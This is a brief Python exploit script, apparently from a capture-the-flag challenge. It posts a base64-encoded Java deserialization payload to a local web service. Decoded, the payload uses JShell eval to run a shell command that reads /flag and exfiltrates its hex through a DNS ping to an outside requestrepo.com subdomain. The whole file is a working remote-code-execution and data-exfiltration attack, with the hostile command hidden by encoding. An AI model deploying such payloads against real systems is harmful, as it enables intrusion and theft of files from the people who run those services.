import requests
import base64

# 你的 payload
payload_base64 = "AgDiAQIAQQQJzNFIhbmm0tAdBIBtJoXIFgT0JAN6JzHgiCbogAAodmFsdWUoeXl5KQB5AsfTvz4nF4EEcZ8KIQWcaN8WQD8EcWWIEmQcbx8EcYeAiAmcikAcBHROY8EQBWTonMeCIJuiBUUE8j4bIDO/4InM0UiFuabS0B0S4iL04zVgDgJQMaXYmAEUAABCAQdK/QBQAQBwbG94aWEudXNlaW5nTG94aWFOdWxsSGFuZGxlcgAcAQBEAQAMeXl5ADUECczRSIW5ptLQHTjNWA4CtWWuDgEGgAAAOv39/f0AHwgCaznBiAQAHxgCNWW2JgJkBTCJjnBgAABS/QBEamRrLmpzaGVsbC5KU2hlbGwAGGNyZWF0Zf3+CP39/QAfDgI1ZbMImOcGAABU/f39ABBldmFsAB8TAgAfDgK1Za4cakmAAAA+/f3+C/39/QAs1ANSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsInBpbmcgJCh4eGQgLXAgLWMgMjU2IC9mbGFnfGN1dCAtYzEtNTApLjJlZmc4MnZqLnJlcXVlc3RyZXBvLmNvbSJ9KTv+CP39/f39/f3+Aw=="

print(f"Payload length: {len(payload_base64)}")

response = requests.post(
    "http://127.0.0.1:8888/",
    data={"data": payload_base64},
    headers={"Content-Type": "application/x-www-form-urlencoded"}
)

print(f"Status: {response.status_code}")
print(f"Response: {response.text}")